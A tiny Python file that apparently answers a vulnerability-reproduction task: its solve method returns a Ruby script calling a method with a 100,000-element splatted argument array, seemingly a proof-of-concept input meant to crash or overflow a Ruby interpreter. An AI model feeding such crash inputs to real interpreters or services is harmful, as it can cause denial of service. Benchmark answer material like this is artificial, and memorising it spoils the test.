import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = (
            "class X\n"
            "  def foo(*args)\n"
            "  end\n"
            "end\n"
            "x = X.new\n"
            "arr = Array.new(100000, 1)\n"
            "x.foo(*arr)\n"
        )
        return poc.encode()